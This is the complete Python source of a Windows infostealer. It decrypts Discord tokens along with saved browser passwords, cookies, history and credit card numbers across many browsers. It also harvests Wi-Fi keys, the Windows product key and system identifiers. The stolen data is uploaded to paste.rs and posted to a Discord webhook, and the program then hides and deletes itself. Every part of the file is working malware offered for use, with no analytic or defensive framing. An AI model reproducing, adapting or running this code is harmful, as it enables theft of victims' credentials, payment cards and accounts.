import os, sys, json, base64, urllib.request, re, ctypes, subprocess, sqlite3, shutil, uuid, platform, threading
from datetime import datetime

if os.name == "nt":
    import win32crypt
    from Crypto.Cipher import AES
else:
    sys.exit(0)

try:
    import requests
except ImportError:
    pass

LOCAL = os.getenv("LOCALAPPDATA", "")
ROAMING = os.getenv("APPDATA", "")
TEMP = os.getenv("TEMP", "")
WEBHOOK = "WEBHOOK_URL"

PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data\\Default",
    'Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default'
}

BROWSERS = {
    'kometa': LOCAL + '\\Kometa\\User Data',
    'orbitum': LOCAL + '\\Orbitum\\User Data',
    'cent-browser': LOCAL + '\\CentBrowser\\User Data',
    '7star': LOCAL + '\\7Star\\7Star\\User Data',
    'sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': LOCAL + '\\Vivaldi\\User Data',
    'google-chrome-sxs': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'google-chrome': LOCAL + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'microsoft-edge': LOCAL + '\\Microsoft\\Edge\\User Data',
    'uran': LOCAL + '\\uCozMedia\\Uran\\User Data',
    'yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data',
    'brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': LOCAL + '\\Iridium\\User Data',
    'opera': ROAMING + '\\Opera Software\\Opera Stable',
    'opera-gx': ROAMING + '\\Opera Software\\Opera GX Stable',
    'coc-coc': LOCAL + '\\CocCoc\\Browser\\User Data'
}

PROFILES = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']


def rc(cmd):
    try:
        return subprocess.run(cmd, capture_output=True, text=True, shell=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.strip()
    except:
        return "unknown"

def gk(path):
    try:
        with open(path + "\\Local State", "r", encoding='utf-8', errors='ignore') as f:
            k = json.load(f)['os_crypt']['encrypted_key']
        return win32crypt.CryptUnprotectData(base64.b64decode(k)[5:], None, None, None, 0)[1]
    except:
        return None

def dc(buff, key):
    try:
        if not isinstance(buff, (bytes, bytearray)):
            buff = bytes(buff)
        if len(buff) < 19:
            return ""
        if len(buff) >= 31:
            cipher = AES.new(key, AES.MODE_GCM, nonce=buff[3:15])
            return cipher.decrypt(buff[15:-16]).decode('utf-8', errors='ignore')
        return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode('utf-8', errors='ignore')
    except Exception:
        return ""

def ip():
    try:
        return json.loads(urllib.request.urlopen("https://api.ipify.org?format=json", timeout=5).read().decode()).get("ip", "unknown")
    except:
        return "unknown"

def sanitize_paste(text):
    result = []
    for c in text:
        o = ord(c)
        if o < 32 and c not in '\t\n\r':
            result.append('�')
        elif 127 <= o <= 159:
            result.append('�')
        else:
            result.append(c)
    return ''.join(result)

def upload_paste(content):
    try:
        clean = sanitize_paste(content)
        resp = requests.post(
            'https://paste.rs/',
            data=clean.encode('utf-8'),
            headers={'Content-Type': 'text/plain; charset=utf-8'},
            timeout=60
        )
        if resp.status_code == 201:
            return resp.text.strip()
        return None
    except:
        return None

def copy_db(src, dst):
    try:
        shutil.copy2(src, dst)
        for ext in ['-wal', '-shm']:
            wal = src + ext
            if os.path.exists(wal):
                shutil.copy2(wal, dst + ext)
        return True
    except:
        return False

def rm_temp(path):
    for ext in ['', '-wal', '-shm']:
        fp = path + ext
        if os.path.exists(fp):
            try:
                os.remove(fp)
            except:
                pass

def sysinfo():
    try:
        ram = str(round(int(rc('wmic computersystem get totalphysicalmemory /value').replace('TotalPhysicalMemory=', '').strip()) / (1024**3), 2)) + " GB"
    except:
        ram = "unknown"
    try:
        u32 = ctypes.windll.user32
        scr = f"{u32.GetSystemMetrics(0)}x{u32.GetSystemMetrics(1)}"
    except:
        scr = "unknown"
    wif = {}
    try:
        for ln in rc('netsh wlan show profiles').split('\n'):
            if 'Profile' in ln and ':' in ln:
                p = ln.split(':')[1].strip()
                if p:
                    for ln2 in rc(f'netsh wlan show profile name="{p}" key=clear').split('\n'):
                        if 'Key Content' in ln2:
                            wif[p] = ln2.split(':')[1].strip() if ':' in ln2 else ''
    except:
        pass
    av = rc('powershell -Command "Get-WmiObject -Namespace \'Root\\SecurityCenter2\' -Class AntivirusProduct | Select-Object displayName"')
    lines = [l.strip() for l in av.split('\n') if l.strip() and 'displayName' not in l and '---' not in l]
    av = ', '.join(lines) if lines else "Windows Defender / None"
    mac = ""
    try:
        for ln in os.popen('ipconfig /all'):
            if 'Physical Address' in ln:
                mac = ln.split(':')[1].strip()
                break
    except:
        pass
    hwid = rc('wmic csproduct get uuid /value').replace('UUID=', '').strip()
    return {
        "username": os.getenv("USERNAME", "unknown"),
        "hostname": os.getenv("COMPUTERNAME", "unknown"),
        "hwid": hwid if hwid else str(uuid.uuid4()),
        "uuid": hwid if hwid else str(uuid.uuid4()),
        "mac": mac,
        "ip": ip(),
        "cpu": rc('wmic cpu get name /value').replace('Name=', '').strip(),
        "gpu": rc('wmic path win32_VideoController get name /value').replace('Name=', '').strip(),
        "ram": ram,
        "screen": scr,
        "os": platform.platform(),
        "windows_key": rc('wmic path softwarelicensingservice get OA3xOriginalProductKey /value').replace('OA3xOriginalProductKey=', '').strip(),
        "antivirus": av,
        "wifi_passwords": wif,
        "time": datetime.now().isoformat()
    }

def get_tokens(path):
    tks, ldb_path = [], path + "\\Local Storage\\leveldb\\"
    if not os.path.exists(ldb_path):
        return tks
    for fl in os.listdir(ldb_path):
        if not fl.endswith((".ldb", ".log")):
            continue
        try:
            with open(f"{ldb_path}{fl}", "r", errors="ignore") as f:
                for m in re.findall(r"dQw4w9WgXcQ:[^\"\\s]*", f.read()):
                    tks.append(m)
        except:
            continue
    return tks

def cleanup():
    try:
        if hasattr(sys, 'frozen'):
            exe_path = sys.executable
            bat_path = os.path.join(TEMP, 'c.bat')
            with open(bat_path, 'w') as f:
                f.write(f'@echo off\ntimeout /t 2 /nobreak >nul\ndel /f /q "{exe_path}"\ndel /f /q "%~f0"')
            subprocess.Popen(bat_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass


class BrowserExtractor:
    def __init__(self):
        self.browsers = BROWSERS
        self.profiles = PROFILES
        self.out_dir = os.path.join(TEMP, "Browser_" + uuid.uuid4().hex[:8])
        os.makedirs(self.out_dir, exist_ok=True)
        self.masterkey = None
        self.data = {}

    def get_master_key(self, path: str) -> bytes:
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                c = f.read()
            local_state = json.loads(c)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except Exception:
            return None

    def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
        try:
            if not isinstance(buff, (bytes, bytearray)):
                buff = bytes(buff)
            if len(buff) < 19:
                return ""
            if len(buff) >= 31:
                iv = buff[3:15]
                payload = buff[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decrypted = cipher.decrypt(payload)
                return decrypted[:-16].decode('utf-8', errors='ignore')
            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode('utf-8', errors='ignore')
        except Exception:
            return ""

    def _create_temp_copy(self, src: str) -> str:
        dst = os.path.join(self.out_dir, f"tmp_{uuid.uuid4().hex}.db")
        if copy_db(src, dst):
            return dst
        return None

    def _ensure_browser(self, name):
        if name not in self.data:
            self.data[name] = {"passwords": "", "cookies": "", "history": "", "credit_cards": ""}

    def passwords(self, name: str, path: str, profile: str):
        try:
            if name in ['opera', 'opera-gx']:
                login_path = os.path.join(path, 'Login Data')
            else:
                login_path = os.path.join(path, profile, 'Login Data')
            if not os.path.isfile(login_path):
                return
            tdb = self._create_temp_copy(login_path)
            if not tdb:
                return
            conn = sqlite3.connect(tdb)
            cursor = conn.cursor()
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            self._ensure_browser(name)
            for row in cursor.fetchall():
                url, username, encrypted_pass = row
                if url and username and encrypted_pass:
                    password = self.decrypt_val(encrypted_pass, self.masterkey)
                    if password:
                        self.data[name]["passwords"] += f"[{name}/{profile}] {url} | {username}:{password}\n"
            cursor.close()
            conn.close()
            rm_temp(tdb)
        except Exception:
            pass

    def cookies(self, name: str, path: str, profile: str):
        try:
            if name in ['opera', 'opera-gx']:
                cookie_path = os.path.join(path, 'Network', 'Cookies')
            else:
                cookie_path = os.path.join(path, profile, 'Network', 'Cookies')
            if not os.path.isfile(cookie_path):
                return
            tdb = self._create_temp_copy(cookie_path)
            if not tdb:
                return
            conn = sqlite3.connect(tdb)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
            self._ensure_browser(name)
            for row in cursor.fetchall():
                host, cname, cpath, encrypted_value, expires = row
                value = self.decrypt_val(encrypted_value, self.masterkey)
                if host and cname and value:
                    self.data[name]["cookies"] += f"{host}\t{'FALSE' if expires == 0 else 'TRUE'}\t{cpath}\t{'FALSE' if host.startswith('.') else 'TRUE'}\t{expires}\t{cname}\t{value}\n"
            cursor.close()
            conn.close()
            rm_temp(tdb)
        except Exception:
            pass

    def history(self, name: str, path: str, profile: str):
        try:
            if name in ['opera', 'opera-gx']:
                hist_path = os.path.join(path, 'History')
            else:
                hist_path = os.path.join(path, profile, 'History')
            if not os.path.isfile(hist_path):
                return
            tdb = self._create_temp_copy(hist_path)
            if not tdb:
                return
            conn = sqlite3.connect(tdb)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
            self._ensure_browser(name)
            for row in cursor.fetchall():
                url, title, visits, last_visit = row
                if url:
                    self.data[name]["history"] += f"[{name}/{profile}] {title} | {url} (Visits: {visits})\n"
            cursor.close()
            conn.close()
            rm_temp(tdb)
        except Exception:
            pass

    def credit_cards(self, name: str, path: str, profile: str):
        try:
            if name in ['opera', 'opera-gx']:
                webdata_path = os.path.join(path, 'Web Data')
            else:
                webdata_path = os.path.join(path, profile, 'Web Data')
            if not os.path.isfile(webdata_path):
                return
            tdb = self._create_temp_copy(webdata_path)
            if not tdb:
                return
            conn = sqlite3.connect(tdb)
            cursor = conn.cursor()
            cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
            self._ensure_browser(name)
            for row in cursor.fetchall():
                name_on_card, exp_month, exp_year, encrypted_num = row
                if encrypted_num:
                    card_num = self.decrypt_val(encrypted_num, self.masterkey)
                    if card_num:
                        self.data[name]["credit_cards"] += f"[{name}/{profile}] {name_on_card} | {exp_month}/{exp_year} | {card_num}\n"
            cursor.close()
            conn.close()
            rm_temp(tdb)
        except Exception:
            pass

    def extract(self):
        def run_func(name, path, profile, func):
            try:
                func(name, path, profile)
            except Exception:
                pass

        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue
            local_state = os.path.join(path, 'Local State')
            if not os.path.isfile(local_state):
                continue
            self.masterkey = self.get_master_key(local_state)
            if not self.masterkey:
                continue

            funcs = [self.passwords, self.cookies, self.history, self.credit_cards]
            threads = []
            for profile in self.profiles:
                profile_path = path if name in ['opera', 'opera-gx'] else os.path.join(path, profile)
                if not os.path.isdir(profile_path):
                    continue
                for func in funcs:
                    t = threading.Thread(target=run_func, args=(name, path, profile, func))
                    t.start()
                    threads.append(t)

            for t in threads:
                t.join()

        return self.data


def main():
    checked, results = [], {"system": sysinfo(), "discord": [], "browser_data": {}}
    hostname = os.getenv("COMPUTERNAME", "UNKNOWN_PC")
    
    for plat, path in PATHS.items():
        if not os.path.exists(path):
            continue
        key = gk(path)
        if not key:
            continue
        for token in get_tokens(path):
            token = token.rstrip("\\")
            try:
                enc = base64.b64decode(token.split('dQw4w9WgXcQ:')[1])
            except:
                continue
            decrypted = dc(enc, key)
            if not decrypted or decrypted in checked:
                continue
            checked.append(decrypted)
            try:
                req = urllib.request.Request('https://discord.com/api/v10/users/@me', headers={"Authorization": decrypted, "User-Agent": "Mozilla/5.0"}, method='GET')
                user = json.loads(urllib.request.urlopen(req, timeout=5).read().decode())
                results["discord"].append({
                    "token": decrypted,
                    "username": user.get("username", "unknown"),
                    "userid": user.get("id", "unknown"),
                    "email": user.get("email", "none"),
                    "phone": user.get("phone", "none"),
                    "source": plat,
                    "verified": user.get("verified", False),
                    "mfa": user.get("mfa_enabled", False),
                    "nitro": user.get("premium_type", 0)
                })
            except:
                continue
    
    extractor = BrowserExtractor()
    raw_data = extractor.extract()
    
    for browser, categories in raw_data.items():
        results["browser_data"][browser] = {}
        for category, content in categories.items():
            if content.strip():
                link = upload_paste(content)
                if link:
                    results["browser_data"][browser][category] = link
    
    msg = f"{hostname} - {ip()} @everyone\n```json\n{json.dumps(results, indent=2)}\n```"
    try:
        urllib.request.urlopen(urllib.request.Request(WEBHOOK, data=json.dumps({"content": msg}).encode(), headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, method='POST'), timeout=10)
    except:
        pass
    
    try:
        ctypes.windll.kernel32.SetFileAttributesW(sys.executable, 2)
    except:
        pass
    cleanup()

if __name__ == "__main__":
    main()
